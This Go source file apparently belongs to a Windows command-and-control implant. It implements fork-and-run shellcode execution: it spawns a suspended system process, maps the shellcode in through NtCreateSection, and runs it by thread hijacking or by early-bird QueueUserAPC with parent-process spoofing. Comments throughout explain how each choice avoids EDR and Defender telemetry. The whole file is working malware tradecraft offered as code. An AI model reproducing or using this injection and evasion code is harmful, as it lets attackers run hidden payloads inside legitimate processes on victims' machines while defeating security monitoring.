//go:build windows

package agent

// forkRun — shellcode execution in a sacrificial process.
//
// Uses plain CreateProcess (no PPID spoof) + NtCreateSection/NtMapViewOfSection
// (no VirtualAllocEx/WriteProcessMemory) + thread hijack.  PPID spoof triggers
// PsSetCreateProcessNotifyRoutineEx; WPM triggers ETW cross-process injection
// telemetry — both avoided here.

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// forkRun spawns a sacrificial process, injects shellcode via
// NtCreateSection + thread hijack, captures stdout/stderr, and returns the output.
func forkRun(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		candidates := []string{
			sysroot + `\System32\RuntimeBroker.exe`,
			sysroot + `\System32\dllhost.exe`,
			sysroot + `\System32\WerFault.exe`,
		}
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\svchost.exe`
		}
	}

	// ── Step 1: Create stdout/stderr pipe ────────────────────────────────────
	sa := windows.SecurityAttributes{InheritHandle: 1}
	sa.Length = uint32(unsafe.Sizeof(sa))
	var outRd, outWr windows.Handle
	piped := windows.CreatePipe(&outRd, &outWr, &sa, 0) == nil
	if piped {
		// Read end must not be inherited by child
		windows.SetHandleInformation(outRd, windows.HANDLE_FLAG_INHERIT, 0)
	}

	// ── Step 2: Spawn suspended with pipe handles ─────────────────────────────
	pi, err := spawnSuspendedWithPipes(process, outWr, piped)
	if piped {
		windows.CloseHandle(outWr) // parent closes write end — EOF detected when child exits
	}
	if err != nil {
		if piped {
			windows.CloseHandle(outRd)
		}
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// ── Step 3: Map shellcode via NtCreateSection ─────────────────────────────
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		if piped {
			windows.CloseHandle(outRd)
		}
		return "", fmt.Errorf("section inject: %w", err)
	}

	// ── Step 4: Thread hijack ────────────────────────────────────────────────
	if err := hijackThread(pi.Thread, remoteAddr); err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		if piped {
			windows.CloseHandle(outRd)
		}
		return "", fmt.Errorf("thread hijack: %w", err)
	}

	// ── Step 5: Resume ───────────────────────────────────────────────────────
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		if piped {
			windows.CloseHandle(outRd)
		}
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)

	if !piped {
		windows.CloseHandle(pi.Process)
		return fmt.Sprintf("[+] fork_run: %d B shellcode executed in %s (PID %d)", len(sc), process, pi.ProcessId), nil
	}

	// ── Step 6: Drain output with 60s timeout ────────────────────────────────
	pipeFile := os.NewFile(uintptr(outRd), "fork_run_out")
	var buf bytes.Buffer
	readDone := make(chan struct{})
	go func() {
		io.Copy(&buf, pipeFile)
		close(readDone)
	}()

	timedOut := false
	select {
	case <-readDone:
	case <-time.After(60 * time.Second):
		timedOut = true
		windows.TerminateProcess(pi.Process, 1)
		<-readDone
	}
	pipeFile.Close()
	windows.WaitForSingleObject(pi.Process, 5000)
	windows.CloseHandle(pi.Process)

	out := buf.String()
	if timedOut {
		out += "\n[!] fork-run: timed out (60s)"
	}
	if out == "" {
		return "(no output)", nil
	}
	return out, nil
}

// spawnSuspendedWithPipes creates a suspended process redirecting stdout/stderr
// to outWr when piped=true, otherwise behaves like spawnSuspendedPlain.
func spawnSuspendedWithPipes(cmdLine string, outWr windows.Handle, piped bool) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation
	si := windows.StartupInfo{
		Flags:      windows.STARTF_USESHOWWINDOW,
		ShowWindow: 0,
	}
	si.Cb = uint32(unsafe.Sizeof(si))
	if piped {
		si.Flags |= windows.STARTF_USESTDHANDLES
		si.StdInput = 0
		si.StdOutput = outWr
		si.StdErr = outWr
	}
	cmdLineW, _ := windows.UTF16PtrFromString(cmdLine)
	appW, _ := windows.UTF16PtrFromString(cmdLine)
	inherit := piped
	err := windows.CreateProcess(
		appW, cmdLineW, nil, nil, inherit,
		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
		nil, nil, &si, &pi,
	)
	return pi, err
}

func terminateSacrificial(pi windows.ProcessInformation) {
	procTerminateProcess.Call(uintptr(pi.Process), 0)
	windows.CloseHandle(pi.Process)
}

// ── Early-bird APC injection ──────────────────────────────────────────────────

var procQueueUserAPC = kernel32.NewProc("QueueUserAPC")

// forkRunAPC spawns a sacrificial process and injects shellcode via QueueUserAPC
// (early-bird pattern). The APC fires before any user code runs because Windows
// loader enters an alertable wait during CRT/ntdll initialisation.
// Unlike thread hijacking, APC injection does not overwrite RIP.
func forkRunAPC(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		// Prefer plain user binaries — system binaries (RuntimeBroker, dllhost)
		// are PPL-protected or Defender-monitored on Server 2022 and may block suspend.
		for _, c := range []string{
			sysroot + `\System32\notepad.exe`,
			sysroot + `\System32\cmd.exe`,
			sysroot + `\SysWOW64\notepad.exe`,
		} {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\cmd.exe`
		}
	}

	// Spawn suspended with PPID spoofed to explorer.exe.
	pi, err := spawnSuspendedSpoofed(process)
	if err != nil {
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// Write shellcode via NtCreateSection + NtMapViewOfSection (no WPM)
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("section inject: %w", err)
	}

	// Queue APC to main thread — fires on first alertable wait in loader
	r, _, e := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if r == 0 {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("QueueUserAPC: %w", e)
	}

	// Resume — shellcode fires before entry point, process stays alive as host
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return fmt.Sprintf("[+] APC shellcode queued in %s (early-bird)", process), nil
}
